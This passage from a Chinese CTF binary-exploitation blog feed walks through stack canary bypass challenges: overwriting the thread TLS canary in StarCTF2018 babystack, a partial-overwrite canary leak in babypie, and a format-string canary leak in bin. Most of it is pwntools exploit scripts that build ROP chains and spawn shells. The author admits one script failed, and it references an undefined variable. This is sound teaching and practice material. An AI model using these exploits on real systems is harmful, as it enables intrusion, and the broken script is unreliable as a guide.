å€¼ã€‚<strong>ä¹Ÿå°±æ˜¯è¯´å¦‚æœä»¥éæ³•æ‰‹æ®µå°†å­çº¿ç¨‹çš„ canary å€¼æ”¹å˜ï¼Œé‚£ä¹ˆè¿™ç§æ”¹å˜ä¸å½±å“å…¶ä»–çº¿ç¨‹çš„æ‰§è¡Œã€‚</strong></p><p>ä¸»çº¿ç¨‹ï¼š</p><ul><li>å¯ä»¥çœ‹åˆ°ä¸»çº¿ç¨‹çš„TLSæ˜¯ç”±mmapå‡½æ•°åˆ›å»ºçš„</li><li>å¹¶ä¸”å¯ä»¥çœ‹åˆ°ï¼štcb,selféƒ½æ˜¯æŒ‡å‘0x7ffff7fdc700çš„</li><li>å¯ä»¥çœ‹åˆ°ï¼šcanary = stack_guard = 0xf04613e573f86400</li></ul><p><img src="/2023/04/13/canary-tls/0.png"></p><h1 id="StarCTF2018-babystackä¾‹é¢˜"><a href="#StarCTF2018-babystackä¾‹é¢˜" class="headerlink" title="StarCTF2018 babystackä¾‹é¢˜"></a>StarCTF2018 babystackä¾‹é¢˜</h1><p>çŸ¥è¯†ç‚¹ï¼š</p><p>- </p><p>ç¨‹åºå¼€å¯äº†RELROã€Canaryå’ŒNXä¿æŠ¤</p><p><img src="/2023/04/13/canary-tls/5-0.png"></p><p>ç¨‹åºé€»è¾‘ï¼š</p><ul><li>mainå‡½æ•°åˆ›å»ºäº†ä¸€ä¸ªå­çº¿ç¨‹</li><li>å­çº¿ç¨‹å¤„ç†å‡½æ•°ä¸­ï¼Œé¦–å…ˆè¾“å…¥è¦å‘é€ä¿¡æ¯çš„å¤§å°sizeï¼Œæ¥ç€å‘sä¸­è¯»å–sizeä¸ªå­—ç¬¦ï¼Œsize&lt;=0x10000</li></ul><p><img src="/2023/04/13/canary-tls/1.png"></p><p><img src="/2023/04/13/canary-tls/2.png"></p><p>æ¼æ´ï¼š</p><ul><li>sçš„å¤§å°åªæœ‰0x1000ï¼Œè€Œsizeæœ€å¤§ä¸º0x10000å­˜åœ¨æº¢å‡ºï¼ˆæº¢å‡ºå­—èŠ‚éå¸¸å¤§</li><li>è¿™é‡Œæœ‰å­çº¿ç¨‹ï¼Œä¸”æº¢å‡ºå­—èŠ‚å¾ˆå¤§ï¼Œæ‰€ä»¥è€ƒè™‘è¦†ç›–TLSå»ç»•è¿‡canary</li><li>æ ˆè¿ç§»+one_gadgetç›´æ¥getshell</li></ul><p>é—®é¢˜1ï¼šTLSä¸­å­˜å‚¨çš„canaryåœ¨fs:0x28å¤„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å…·ä½“åœ¨å“ªé‡Œï¼Œæ‰€ä»¥åªèƒ½çˆ†ç ´ï¼š</p><p>ï¼ˆå½“ç„¶è¿™é‡Œä¹Ÿæ²¡å¿…è¦çˆ†ç ´ï¼Œå› ä¸ºæº¢å‡ºè¶³å¤Ÿå¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾€åè¦†ç›–å¤šä¸€ç‚¹æ€»èƒ½è¦†ç›–åˆ°canaryï¼Œä½†æ˜¯å¦‚æœè¦†ç›–åˆ°ä¸€äº›é‡è¦æ•°æ®ï¼Œå¯ä»¥ä¼šå¯¼è‡´ç¨‹åºç›´æ¥å´©æºƒã€‚</p><ul><li>çˆ†ç ´å‡ºTLSä¸­å­˜å‚¨çš„canaryè·ç¦»è¾“å…¥ç‚¹ä¸º6128</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>offset <span class="token operator">=</span> <span class="token number">0x1020</span> <span class="token operator">+</span> <span class="token number">8</span>count <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> count    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many bytes do you want to send?"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_addr <span class="token operator">=</span> <span class="token number">0x4009E7</span>    payload  <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x1010</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>offset<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    temp <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Welcome"</span> <span class="token keyword">in</span> temp<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        offset <span class="token operator">+=</span> <span class="token number">8</span> <span class="token comment">#å› ä¸ºæ˜¯x64</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/13/canary-tls/3.png"></p><p>é—®é¢˜2ï¼šè¦æƒ³æ‰¾åˆ°one_gadgetï¼Œå¾—å…ˆçŸ¥é“libc_baseï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æ³„æ¼putsçš„gotè¡¨é¡¹å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰ä¸€æ¬¡è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æ„é€ ä¸€æ¡ROPé“¾å…ˆæ³„æ¼å‡ºlibcï¼Œç„¶ååœ¨å‘bssæ®µè¯»å–one_gadgetï¼Œæœ€åæ ˆè¿ç§»è¿‡å»æ‰§è¡Œone_gadgetã€‚</p><p>æœ€ç»ˆexpï¼š(è¿œç¨‹ï¼Œæœ¬åœ°éƒ½æ²¡é€šï¼Œç”¨å®˜æ–¹expä¹Ÿæ²¡åŒï¼Œå¯èƒ½æ˜¯libcçš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘çš„glibc-all-in-oneå‡ºäº†äº›é—®é¢˜ï¼Œæäº†å¾ˆä¹…ï¼Œä¸æƒ³æäº†)</p><p>æ€»ç»“ä¸€æ³¢ï¼š</p><ul><li>é’ˆå¯¹å¤šçº¿ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹TLSçš„canaryï¼Œä»è€Œç»•è¿‡canaryï¼ˆå‰ææ˜¯æº¢å‡ºé•¿åº¦è¶³å¤Ÿå¤§ã€‚</li><li>å¯¹äºæ ˆè¿ç§»ï¼Œåœ¨æœ‰readå‡½æ•°çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨æ ˆè¿ç§»åˆ°bssæ®µï¼Œä¸€èˆ¬æ˜¯bss+0x300çš„ä½ç½®å¼€å§‹å†™ã€‚å¦‚æœå¯ä»¥æ³„æ¼æ ˆåœ°å€ï¼Œå°±å¯ä»¥ç›´æ¥å†™åˆ°æ ˆä¸­ï¼Œç„¶åebpå†™espçš„åœ°å€ï¼Œleaveå°±ä¼šè·³åˆ°espå»æ‰§è¡Œæˆ‘ä»¬å†™å…¥çš„ä¸œè¥¿ã€‚</li></ul><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token triple-quoted-string string">"""offset = 0x1020 + 8count = 1while True:    print count    io = process('./bs')    io.recvuntil("How many bytes do you want to send?")    io.sendline(str(offset))    ret_addr = 0x4009E7    payload  = 'a'*0x1010    payload += p64(0xdeadbeef)    payload += p64(ret_addr)    payload += 'a'*(offset-len(payload))    io.send(payload)    temp = io.recvall()    if "Welcome" in temp:        io.close()        break    else:        offset += 8        count += 1        io.close()"""</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    offset <span class="token operator">=</span> <span class="token number">6128</span>    <span class="token comment">#io = process('./bs')</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26773</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc    fakerbp <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x300</span>    ret_addr <span class="token operator">=</span> <span class="token number">0x4009E7</span>    pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400C03</span>    pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x400C01</span>    leave_ret <span class="token operator">=</span> <span class="token number">0x400955</span>    payload  <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1010</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fakerbp<span class="token punctuation">)</span>    <span class="token comment">#leak libc</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#read one_gadget to bss</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fakerbp<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>    payload  <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"It's time to say goodbye.\n"</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>    getshell_libc <span class="token operator">=</span> <span class="token number">0xf03a4</span>    base_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libc    one_gadget <span class="token operator">=</span> base_addr <span class="token operator">+</span> getshell_libc    payload  <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®˜æ–¹expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">import</span> os<span class="token keyword">import</span> syselfPath <span class="token operator">=</span> <span class="token string">"./bs"</span>libcPath <span class="token operator">=</span> <span class="token string">"./libc.so.6"</span>remoteAddr <span class="token operator">=</span> <span class="token string">"47.100.96.94"</span>remotePort <span class="token operator">=</span> <span class="token number">9999</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfPathelf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary<span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span>elfPath<span class="token punctuation">)</span>    libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"d"</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span>elfPath<span class="token punctuation">,</span> env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">:</span> libcPath<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteAddr<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>    <span class="token keyword">if</span> libcPath<span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libcPath<span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"deepin-terminal"</span><span class="token punctuation">,</span> <span class="token string">"-x"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">]</span>success <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span> value<span class="token punctuation">:</span> log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"{} -&gt; {:#x}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">DEBUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"DEBUG: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    0x0000000000400c03 : pop rdi ; ret    0x0000000000400c01 : pop rsi ; pop r15 ; ret    0x0000000000400955 : leave ; ret    '''</span>    prdi <span class="token operator">=</span> <span class="token number">0x0000000000400c03</span>    prsip <span class="token operator">=</span> <span class="token number">0x0000000000400c01</span>    leaveret <span class="token operator">=</span> <span class="token number">0x0000000000400955</span>    libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'one_gadget'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xf1147</span>    base <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token string">'\0'</span> <span class="token operator">*</span> <span class="token number">0x1010</span><span class="token punctuation">,</span> base <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">,</span> prdi<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>prdi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> prsip<span class="token punctuation">,</span> base<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>leaveret<span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"send?\n"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\0\0'</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    success<span class="token punctuation">(</span><span class="token string">"libc"</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'one_gadget'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="http://www.openwall.com/lists/oss-security/2018/02/27/5">New bypass and protection techniques for ASLR on Linux</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TLS </tag>
            
            <tag> thread stack </tag>
            
            <tag> Canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canaryæ”»å‡»è§£é¢˜ç¯‡</title>
      <link href="/2023/04/12/canary-jie-ti-pian/"/>
      <url>/2023/04/12/canary-jie-ti-pian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="babypie"><a href="#babypie" class="headerlink" title="babypie"></a>babypie</h1><p>çŸ¥è¯†ç‚¹ï¼š</p><ul><li>è¦†ç›–canaryä½å­—èŠ‚leak canary</li><li>ASLR/PIEéšæœºåŒ–åœ°å€é«˜ä½ï¼Œä½ 12 ä½çš„é¡µå†…åç§»å§‹ç»ˆæ˜¯å›ºå®šçš„</li></ul><p>ç¨‹åºå¼€å¯äº†Canaryã€NXå’ŒPIEä¿æŠ¤</p><p><img src="/2023/04/12/canary-jie-ti-pian/1-0.png"></p><p>ç¨‹åºé€»è¾‘ï¼š</p><ul><li>åœ¨è¾“å…¥è¾“å‡ºå‰ï¼Œå°†bufæ ˆç©ºé—´æ¸…0</li><li>ä¸¤æ¬¡æº¢å‡ºï¼Œç¬¬ä¸€æ¬¡æº¢å‡ºåæœ‰ä¸€æ¬¡è¾“å‡º</li><li>å­˜åœ¨åé—¨å‡½æ•°</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/1-1.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/1-2.png"></p><p>æ¼æ´åˆ©ç”¨ï¼š</p><ul><li>åˆ©ç”¨ç¬¬ä¸€æ¬¡æº¢å‡ºleak canary  &lt;=== æŠŠcanaryä½å­—èŠ‚è¦†ç›–ä¸ºé0</li><li>åˆ©ç”¨ç¬¬äºŒæ¬¡æº¢å‡ºä¿®æ”¹ret_addr  &lt;=== æŠŠret_addrä¿®æ”¹ä¸ºsub_A3Eå‡½æ•° &lt;=== çˆ†ç ´</li></ul><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./babypie"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x29</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x29</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'deadbeef'</span> <span class="token operator">+</span> <span class="token string">'\x3E\x0A'</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> e<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/1-3.png"></p><h1 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h1><p>çŸ¥è¯†ç‚¹ï¼š</p><ul><li>printfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»»æ„è¯»leak canary</li></ul><p>ç¨‹åºå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤</p><p><img src="/2023/04/12/canary-jie-ti-pian/2-0.png"></p><p>ç¨‹åºé€»è¾‘ï¼š</p><ul><li>åœ¨mainå‡½æ•°ä¸­å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>funå‡½æ•°ä¸­å­˜åœ¨æº¢å‡º</li><li>å­˜åœ¨getflagåé—¨å‡½æ•°</li></ul><p><img src="/2023/04/12/canary-jie-ti-pian/2-1.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/2-2.png"></p><p><img src="/2023/04/12/canary-jie-ti-pian/2-3.png"></p><p>æ¼æ´åˆ©ç”¨ï¼š</p><ul><li>åˆ©ç”¨printfæ ¼å¼åŒ–å­—ç¬¦ä¸²leak canary ==&gt; æ‰¾åˆ°canaryç›¸å¯¹äºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»</li><li>åˆ©ç”¨æº¢å‡ºè¦†ç›–ret_addrä¸ºgetflagå‡½æ•°åœ°å€</li></ul><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bin"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./bin"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%7$p'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 